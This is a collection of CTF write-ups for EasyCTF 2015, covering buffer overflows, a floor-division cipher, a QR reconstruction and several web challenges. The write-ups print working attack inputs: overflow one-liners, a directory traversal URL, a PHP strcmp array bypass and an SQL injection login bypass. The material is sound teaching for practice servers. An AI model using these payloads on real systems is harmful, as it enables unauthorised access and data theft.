<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-davidjacobson
description: CTF writeups and security challenges by DavidJacobson.
---

# Writeups by DavidJacobson

Source repository: `/repos/DavidJacobson`

## Repository Index

- EasyCTF-2015-writeup/binary_exploitation.md
- EasyCTF-2015-writeup/crypto.md
- EasyCTF-2015-writeup/programming.md
- EasyCTF-2015-writeup/readme.md
- EasyCTF-2015-writeup/web.md

## Writeup Content


### File: EasyCTF-2015-writeup/binary_exploitation.md

Binary Exploitation
------------------


Buffering - 80 pts
-----------------

Problem info:

Can you overflow the stack? Try it at /problems/overflow1 on the EasyCTF shell server. The source is available at /problems/overflow1/overflow1.c, and the program you're trying to overflow is at /problems/overflow1/overflow1. Good luck!

On the sever we see  a C file called overflow.c, and it contains the source for the binary. Opening it up the buffer overflow is quite obvious
```C
    char buf[20];
    int x = 0;
    gets(buf);
    if (x == 1337) {

```
So, we need to write up the stack and insert the value of 1337. 1337 in hex is 539 
To encode this in little endian byte order we use:
```
\x05\x39
```
Now, we use trial and error to see where the buffer overflow
```zsh
(python -c "print 'A'*25) | ./overflow1
```
After trial and error we find the number to be 28, and so we send the proper input
```zsh
(python -c "print 'A'*28 + '\x39\x05'") | ./overflow1
```
There is the flag
```
easyctf{i_wish_everything_were_th1s_34sy}

```

Much Studying  - 400 pts
----------------------

To start this challenge we navigate to /problems/aplit

Here we see a binary, and a C file.

When looking at the C file the relevant code is immediatly noticed: 
```C
int main(int argc, char **argv) {
        int score = 0;
        printf("CollageBored (R) Advanced Placement Literature Grader\n");
        if (argc != 2) {
                printf("Usage: %s [essay]\n", argv[0]);
                return 1;
        }
        char buf[700];
        strcpy(buf, argv[1]);
        printf("-------------- YOUR SUBMISSION --------------\n");
        printf("%s\n", buf);
        printf("---------------------------------------------\n");
        printf("According to our analysis, your response received a grade of %d!\n", score);
        if (score > 12) {

```
The program reads user input into a buffer, and then reads a variable. This is a buffer overflow. The approach to this is actually quite simple. We need to see how many characters we need to pass to it to overwrite the score variable. 
Some trial and error is required, but eventually I found it to be 717.
```zsh
redacted@shell:/problems/aplit$ ./aplit $(python -c "print 'a'*717")
```
And there is our flag:
```
CollageBored (R) Advanced Placement Literature Grader
-------------- YOUR SUBMISSION --------------
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
---------------------------------------------
According to our analysis, your response received a grade of 1633771873!
Wow, you're an HONOR student! Here's a flag: CollageBored (R) Advanced Placement Literature Grader
-------------- YOUR SUBMISSION --------------
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
---------------------------------------------
According to our analysis, your response received a grade of 1633771873!
Wow, you're an HONOR student! Here's a flag: easyctf{essays_are_too_hard}

```
ez
```
flag easyctf{essays_are_too_hard}
```



### File: EasyCTF-2015-writeup/crypto.md

Crypto
----------

Hardwood Floors -  200 pts
---------------------

This was a fun problem, we are given the following code:
```py
message = "<redacted>"
key = 3
encrypted = ' '.join([str(ord(c)//key) for c in message])
print(encrypted)
```
and this corresponding cipher text:
```
27 39 33 34 10 36 32 33 35 10 37 34 10 38 35 34 37 38 15 15 15 10 33 32 38 40 33 38 34 41 34 36 16 16 38 31 33 16 39 35 38 35 16 36 41
```
To see whats happening we just look at the code. For each character in the string to be 'encrypted', it is convered to an ordinal and divided by three.
What's interesting is the use of floor division. This means the value following the . is truncated. For example, both 4.999999 and 4.000001 when floor divided by 2 are 2.
This means there are 3 different possible values for each character (9//3 = 3, 10//3=3, 11//3=3).

So we need to compute all possible values for each character.

```py
import string
import itertools

key = 3
keys = {} # Dict to store values
for each in string.printable: # All possible values that could have been encrypted
	if not str(ord(each) // key) in keys.keys():
		keys[str(ord(each) // key)] = [each]
	else:
		keys[str(ord(each) // key)].append(each)
#print keys
message = "27 39 33 34 10 36 32 33 35 10 37 34 10 38 35 34 37 38 15 15 15 10 33 32 38 40 33 38 34 41 34 36 16 16 38 31 33 16 39 35 38 35 16 36 41"
message = message.split()
dec = [keys[x] for x in message]
for each in dec:
	print "|".join(each) # Print out a graph

```
Now we have all the possible values for each char, and it looks like this: (I put my guesses next to each place)
```
c|d|e e 
a|b|` a 
r|s|t s 
x|y|z y 
c|d|e c 
r|s|t t 
f|g|h f 
{|||} { 
f|g|h f 
l|m|n l 
0|1|2 0 
0|1|2 0 
r|s|t r 
]|^|_ _ 
c|d|e d 
0|1|2 1
u|v|w v
i|j|k i
r|s|t s
i|j|k i
0|1|2 0
l|m|n n
{|||} } 
```
We know the first characters will be easyctf{ and the last will be }, and from there it's just a matter of choosing the best possible fit.
```
flag: easyctf{fl00r_d1visi0n}
```

Pixels - 180 pts
--------------
This problem had two images, both titled 'mystery' with just a - between them.
I decided to take this literally, and attempt to subtract the images from eachother. This was acomplished using imagemagick, 
```zsh
redacted@redacted> convert mystery1.png mystery2.png -compose d
ifference -composite -colorspace Gray new.png
```


![lolmd](https://raw.githubusercontent.com/DavidJacobson/EasyCTF-2015-writeup/master/img/new.png)


And we get a picture with the flag
```
flag: easyctf{PRETTY_PIXEL_MATH}
```



### File: EasyCTF-2015-writeup/programming.md

Programming
-------------


Coordinates - 150 pts
----------------------
This challenge gave me nothing but a set of coordinates, the type used in graphing.
The file was named qr.txt, which gave me the idea that they would be used in a qr code. 
I wrote a python script to put together the qr code
```py
import numpy as np
import matplotlib.pyplot as plt
check = np.zeros((29, 29)) # Max number from each x,y
c = [(22, 25), (14, 9), (11, 14), (2, 13), (23, 4), (12, 27), (15, 0), (23, 28), (22, 10), (21, 21), (20, 15), (20, 5), (23, 1), (24, 8), (13, 0), (5, 27), (19, 4), (0, 20), (20, 13), (15, 11), (27, 18), (23, 23), (15, 8), (27, 12), (21, 0), (1, 26), (16, 0), (8, 17), (18, 2), (14, 1), (13, 14), (3, 27), (19, 10), (7, 16), (6, 15), (17, 3), (9, 13), (27, 16), (16, 28), (15, 20), (19, 14), (18, 13), (8, 15), (8, 25), (18, 8), (21, 19), (3, 12), (8, 26), (20, 8), (11, 22), (7, 21), (9, 17), (17, 18), (19, 8), (21, 8), (28, 16), (23, 15), (19, 3), (23, 25), (11, 25), (19, 2), (27, 7), (17, 1), (14, 12), (3, 23), (17, 26), (9, 10), (10, 22), (16, 8), (3, 8), (24, 18), (2, 27), (4, 27), (27, 14), (21, 3), (6, 12), (7, 2), (23, 26), (14, 2), (27, 10), (18, 20), (26, 25), (3, 20), (5, 2), (24, 5), (9, 21), (2, 21), (23, 22), (12, 22), (2, 1), (7, 5), (16, 12), (11, 15), (21, 22), (12, 4), (7, 4), (21, 7), (21, 1), (28, 20), (5, 14), (11, 13), (3, 7), (4, 1), (1, 24), (19, 13), (19, 26), (0, 12), (10, 28), (23, 18), (10, 10), (26, 20), (11, 21), (14, 20), (27, 5), (19, 19), (11, 1), (9, 4), (25, 7), (4, 10), (25, 16), (10, 4), (14, 17), (10, 17), (5, 16), (28, 12), (17, 17), (7, 28), (8, 7), (21, 23), (26, 28), (26, 19), (0, 17), (8, 11), (28, 11), (1, 20), (21, 18), (7, 0), (0, 16), (12, 14), (17, 5), (10, 18), (9, 19), (26, 9), (12, 3), (18, 24), (23, 3), (18, 22), (27, 2), (2, 8), (24, 15), (21, 12), (9, 26), (7, 14), (9, 11), (21, 11), (19, 6), (26, 18), (13, 23), (21, 27), (18, 26), (24, 1), (23, 5), (22, 7), (1, 27), (1, 4), (7, 26), (18, 9), (27, 4), (19, 18), (23, 2), (23, 19), (17, 9), (28, 24), (12, 1), (27, 22), (14, 11), (20, 0), (13, 9), (3, 5), (0, 14), (5, 9), (12, 11), (10, 26), (1, 2), (27, 3), (13, 7), (27, 15), (10, 25), (7, 27), (25, 22), (26, 1), (10, 13), (27, 11), (6, 9), (11, 4), (2, 7), (16, 16), (11, 9), (12, 8), (2, 17), (16, 22), (9, 2), (11, 17), (23, 11), (7, 15), (16, 23), (24, 14), (1, 12), (5, 5), (5, 11), (25, 1), (4, 15), (18, 11), (11, 12), (4, 9), (26, 7), (13, 25), (25, 5), (22, 16), (15, 23), (9, 12), (20, 4), (27, 19), (0, 11), (5, 23), (22, 21), (12, 2), (6, 21), (26, 24), (24, 26), (13, 22), (7, 24), (28, 7), (5, 7), (22, 23), (16, 14), (25, 18), (26, 11), (10, 7), (9, 5), (19, 28), (9, 6), (1, 21), (10, 24), (0, 15), (18, 16), (7, 17), (19, 0), (14, 14), (26, 15), (8, 22), (27, 17), (23, 21), (16, 26), (4, 23), (18, 28), (7, 22), (5, 25), (1, 3), (22, 8), (15, 5), (22, 27), (14, 22), (23, 10), (5, 15), (7, 18), (14, 19), (20, 26), (13, 1), (14, 27), (18, 12), (9, 18), (16, 10), (28, 28), (20, 10), (5, 1), (23, 7), (26, 23), (0, 7), (9, 8), (26, 12), (2, 9), (5, 19), (10, 8), (13, 3), (5, 3), (11, 20), (12, 19), (1, 13), (26, 5), (9, 20), (26, 16), (1, 15), (10, 19), (20, 25), (15, 1), (10, 15), (22, 12), (1, 14), (4, 14), (20, 9), (5, 24), (2, 19), (15, 3), (25, 24), (21, 6), (19, 11), (15, 12), (2, 10), (19, 17), (21, 26), (6, 11), (13, 17), (24, 16), (8, 18), (24, 19), (7, 19), (12, 21), (6, 7), (21, 5), (1, 1), (8, 8), (1, 5), (5, 21), (11, 7), (17, 12), (7, 6), (12, 16), (18, 17), (2, 23), (7, 7), (10, 5), (5, 26), (16, 11), (3, 21), (16, 3), (15, 25), (5, 4), (9, 23), (1, 11), (15, 16), (1, 25), (21, 4), (2, 14), (12, 24), (9, 14), (17, 4), (17, 14), (27, 25), (11, 0), (24, 25), (19, 15), (20, 17), (4, 5), (7, 8), (13, 15), (2, 15), (7, 23), (8, 4), (6, 13), (11, 23), (12, 13), (16, 7), (27, 21), (13, 6), (7, 11), (15, 6), (1, 9), (1, 23), (7, 3), (25, 21), (16, 2), (7, 1), (8, 12), (6, 19), (2, 5), (10, 3), (25, 17), (27, 1), (14, 28), (21, 2), (26, 27), (4, 21), (3, 1), (14, 25), (10, 20), (26, 10), (11, 28)]

for each in c: # For each coordinate
	check[each[0]][each[1]] = 1  # Set it to one



plt.imshow(check, cmap='gray', interpolation='nearest')
plt.axis('off') # Don't interfere with the code
plt.show()
```
And sure enough the out put was a perfect qr code
![lolmd](https://github.com/DavidJacobson/EasyCTF-2015-writeup/blob/master/img/figure_2.png)
Now we just need to scan it using [this](https://zxing.org/w/decode)


| Raw text        | easyctf{bet_y0u_read_that_wiki_page}           |
| ------------- |:-------------:|
| Raw bytes| 42 46 56 17 37 96 37 46   67 b6 26 57 45 f7 93 07 55 f7 26 56 16 45 f7 46   86 17 45 f7 76 96 b6 95 f7 06 16 76 57 d0 ec 11 	| 	   |ec 11 ec 11 ec 11 ec 11 ec 11 ec 11 ec 11 ec |

```
flag: easyctf{bet_y0u_read_that_wiki_page} 
```



### File: EasyCTF-2015-writeup/readme.md

This is a writeup for EasyCTF 2015. 
-------------------------
##[Programming](programming.md)
##[Web](web.md)
##[Binary Exploitation](binary_exploitation.md)
##[Cryptography](crypto.md)

Firstly, the easter eggs!


If we checkout the robots.txt we find
```
User-agent: *
Disallow: /95125f09551360c5294d180b013d047d.html
```
When we visit that webpage we are greeted with an easter egg interface. I entered the first one that's given, and another I had found but had no use for.
```
egg{gotta_catch_'em_all}
```
I found the other one on Anomat's website, http://anomat.cf/ In the source:
```
egg{lel_st4lk3r_much}
```



### File: EasyCTF-2015-writeup/web.md

Web
-----


Plot Twist - 20 pts
----------

For this challenge we were given a webpage: https://www.easyctf.com/static/problems/plot-twist/index.html
Normally the first problem has the flag 'hidden' as a comment, but they predicted that' 
```html
    <!-- you thought the flag would be in the comments didn't you? nice try we're better than that -->
```
Just a line down though, there is a line that says
```html
<script type="text/javascript" src="script.js"></script>
```
Upon opening script.js I saw 
```js
console.log('no one would EVER think to look in the console! flag backup: easyctf{remember_to_check_everywhere}');
```

Teach Me How to Write Like This - 30pts
----------------------

This challenge gives us a wbesite where the content is blurred, but if we just look at the source. (Firefox use: view-source before the url) we can see the content just fine

```
flag: easyctf{geico_geck0s}
```

2147483648% Secure - 35 pts
-------------------
This challenge has a webpage which says there is a hidden flag. It's not hidden in plain text in the source, but there is a bit of obfustaced Javascript

```js
			var _0xa107=["\x64\x65\x76\x65\x6C\x6F\x70\x65\x72\x5F\x63\x6F\x6E\x73\x6F\x6C\x65\x5F\x69\x73\x5F\x79\x6F\x75\x72\x5F\x66\x72\x69\x65\x6E\x64","\x65\x61\x73\x79\x63\x74\x66\x7B","\x7D"];
			var _0x6fdc=[_0xa107[0],_0xa107[1],_0xa107[2]];
			var secret=_0x6fdc[0];
			secret=_0x6fdc[1]+secret+_0x6fdc[2];
```
There is no need to deobfuscate it in this case, we know the name of the variable where the data is being stored. Open up the console, and run console.log(secret)

```
flag: easyctf{developer_console_is_your_friend}
```

Wastebin 1 - 90 pts 
-----------------
This challenge wasn't worth 90 points, it shows the dangers of using client side authentication though. If we look at the source we see an array of user credentials. Admin is 
```
flag: easyctf{cr4zy_p4ssw0rds}
```

Easter - 100 pts
-----------
This challenge has a webpage where there isn't much you can do. There is a single image on the page, and the source reveals loads of obfuscated javascript. I wasted a lot of time trying to deobfuscate it, in reality the solution was to enter the konami code and press enter. Once entered, the page spat out some binary
```
01111011011011010110100101110011011100110110100101101111011011100111001101110101011000110110001101100101011100110111001101111101
```
A quick binary to ascii translation and we get:
```
easyctf{missionsuccess}
```

Personal Home Page - 225 pts
------------
The Web challenges started getting interesting here. On the main page the url is http://web.easyctf.com:10200/?page=pages/index.html

The GET value being set is the page value, which means we can control what is viewed. 

http://web.easyctf.com:10200/supersecretflag.txt however is still unaccesable. 
This is something called local file inclusion, where we can view data stored on the server.
Set the paramater to: http://web.easyctf.com:10200/?page=pages/supersecretflag.txt
And...

```
 Are you trying to hack me? 
```

It knows!

jk, directory traversal, move up one dir and we can find the file easily:
```
http://web.easyctf.com:10200/?page=pages/../supersecretflag.txt
```
There we go
```
flag:  easyctf{file_get_contents_is_9_safe} 
```

Super Secure Lemons - 225 pts
-----------------------

This page happens to use SSL, but my browser gave me an error while viewing it. I ignored it because that happens often when you run your own page, you use self signed certs. Once on the page, I inspected the SSL cert via Firefox.
```
flag: easyctf{never_trust_se1f_signd_certificates}
```

Wastebin 2 - 250 pts
------------------
Here is the information given for this challenge
```
So after the previous fiasco, I decided to generate a random admin password, and hide it in a file that no one will ever find. And don't try Googling it either, cuz Google can't find it either! Hahaha >:) Link
```

There is a hint in there, not to google it. Google is known for crawling sites, and using a robots.txt file to guide itself. 
Looking at http://web.easyctf.com:10207/robots.txt we see:
```
User-agent: *
Disallow: /2/password_Tj9WBkFpORmHYaYBG5GR7VZzgDaEM2e2aWeeCRtJ.txt
```
Check the page, and sure enough the password is right there: 11FutLBObDdAnSIyEo9LF6TLiWuG8GpHSLnRBAYD4jUGM0O4Jbt8KPasU5CpAGmZW2dX97HX4xHau8asmrN5CzIiM6Xb51plWa3q

Now, login as admin, and easy, done:
```
flag: easyctf{looks_like_my_robot_proof_protection_isn't_very_human_proof}
```

Pretty Horrible Programming - 275 pts
-------------------------------------
This page has a login form. The source tells us that the PHP (as indicated by the title) is located at index.source.php

The php loads in the flag as a variable, then reads the get variables for the password. As a side note, sneding passwords via get is a terrible idea. The relevant code is this

```php
            if (isset($_GET["password"])) {
                if (strcmp($_GET["password"], $pass) == 0) {
                    $auth = true;
                
```
The flaw is the use of strcmp. Some quick googling and I find an article that for bypassing [strcmp](http://danuxx.blogspot.com/2013/03/unauthorized-access-bypassing-php-strcmp.html)

The idea is to pass it an array and cause an error. When we click login with a password, the url looks like this
```
http://web.easyctf.com:10201/index.php?password=random
```

Set password to an array, and done.
```
http://web.easyctf.com:10201/index.php?password[]=asdsd
```
It errors out and echos the flag
```
flag: easyctf{never_trust_strcmp} 
```


Wastebin 3 - 325 pts 
-----------------------
Wastebin 3 presents us with a familiar login page. The source also tells us the location of the php source code.
The relevant code is:

```php
            include("functions.php"); // connect to mysql server
            
            $query = "SELECT * FROM `users` WHERE username='$username' AND password='$password'";
            $result = mysql_query($query);
            $rows = array();
            while($row = mysql_fetch_array($result)) {
                $rows[] = $row;
```
This code is vulnerable to SQLi (SQL Injection).
If we pass the correct value to user name, we can make the entire right side of the query useless:
```
admin' -- 
```
What this does is close the ' in the query, and then comment out the rest, so the query looks like:
```sql
SELECT * FROM `users` WHERE username='admin' -- ' AND password='$password'
```
Done
```
flag: easyctf{54771309-67e5-4704-8743-6981a40b}
```

